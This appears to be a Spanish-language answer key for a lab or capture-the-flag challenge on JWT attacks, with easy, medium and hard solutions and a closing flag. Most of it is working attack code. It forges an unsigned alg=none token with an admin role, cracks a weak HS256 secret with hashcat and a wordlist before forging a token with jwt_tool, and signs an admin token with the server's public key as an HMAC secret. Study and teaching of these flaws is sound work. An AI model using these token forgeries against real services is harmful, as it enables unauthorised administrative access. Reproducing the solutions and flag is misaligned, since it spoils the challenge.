Easy — Bypass alg=none

  1. Genera un token legítimo con usuario "guest" desde el formulario.
  2. Decodifica el header (base64url), cambia "alg":"HS256" a "alg":"none".
  3. Modifica el payload: cambia "role":"user" a "role":"admin".
  4. Construye el token con firma vacía (HEADER.PAYLOAD.) con Python: 
    import base64, json
def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()
h = b64url({"alg":"none","typ":"JWT"})
p = b64url({"sub":"admin","role":"admin","iat":1700000000})
print(f"{h}.{p}.")
  5. Envía el token al verificador. El servidor lo acepta sin verificar la firma.

Medium — Fuerza bruta del secreto debil

  1. El secreto es corto. Usa hashcat para crackear la firma HS256: 
    hashcat -a 0 -m 16500 'TOKEN_AQUI' /usr/share/wordlists/rockyou.txt
  2. O verifica manualmente con Python: 
    import hmac, hashlib, base64
secret = 'secret'  # prueba palabras comunes
h, p, s = 'TOKEN'.split('.')
sig = base64.urlsafe_b64encode(
    hmac.new(secret.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
).rstrip(b'=').decode()
print('Match!' if sig == s else 'No match')
  3. El secreto es secret (visible en la interfaz Easy). Con el secreto conocido, forja un token admin con firma valida usando jwt_tool: 
    python3 jwt_tool.py TOKEN -T -S hs256 -p 'secret'

Hard — Algorithm confusion (RS256 a HS256 con clave publica)

  1. Obtén la clave publica del servidor desde /jwt/jwks (campo n del JWK).
  2. El servidor acepta tokens HS256 firmados con esa clave publica como secreto HMAC.
  3. Genera el token de confusion con Python: 
    import hmac, hashlib, base64, json
pub_key = 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0...'  # del /jwt/jwks
def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
h = b64url({"alg":"HS256","typ":"JWT"})
p = b64url({"sub":"admin","role":"admin","iat":1700000000})
sig = base64.urlsafe_b64encode(
    hmac.new(pub_key.encode(), f'{h}.{p}'.encode(), hashlib.sha256).digest()
).rstrip(b'=').decode()
print(f'{h}.{p}.{sig}')
  4. Envía el token forjado al verificador. Flag dedicada: HL{jw7_m4n1pu14710n_4dm1n_0wn3d}
